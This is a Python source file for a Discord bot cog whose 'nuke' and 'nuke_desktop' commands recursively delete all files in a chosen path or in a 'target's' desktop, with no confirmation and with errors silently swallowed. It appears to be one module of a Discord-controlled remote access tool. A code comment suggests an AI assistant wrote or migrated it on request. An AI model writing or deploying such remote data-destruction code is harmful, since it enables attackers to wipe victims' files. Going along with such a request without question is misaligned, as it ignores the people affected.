import os
import shutil
import discord
from discord.ext import commands
from src.client.core.platform import Platform

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="nuke", help="Wipes all user files in a directory (USE WITH CAUTION).")
    async def nuke_directory(self, ctx, path):
        """Recursively deletes everything in a given path."""
        if not os.path.exists(path):
            await ctx.send(f"❌ Path not found: `{path}`")
            return

        try:
            await ctx.send(f"☢️ **NUKING DIRECTORY:** `{path}`...")
            # We use a confirmation step or just do it? User said migrate, so I'll implement.
            # In a professional tool, we might want a double check.
            for filename in os.listdir(path):
                file_path = os.path.join(path, filename)
                try:
                    if os.path.isfile(file_path) or os.path.islink(file_path):
                        os.unlink(file_path)
                    elif os.path.isdir(file_path):
                        shutil.rmtree(file_path)
                except Exception as e:
                    pass # Continue nuking other files
            await ctx.send(f"✅ Nuke complete. `{path}` is now empty (or as empty as permissions allowed).")
        except Exception as e:
            await ctx.send(f"❌ Nuke Error: {str(e)}")

    @commands.command(name="nuke_desktop", help="Wipes the target's desktop.")
    async def nuke_desktop(self, ctx):
        desktop = os.path.join(Platform.get_home_path(), "Desktop")
        await self.nuke_directory(ctx, desktop)

async def setup(bot):
    await bot.add_cog(Nuke(bot))
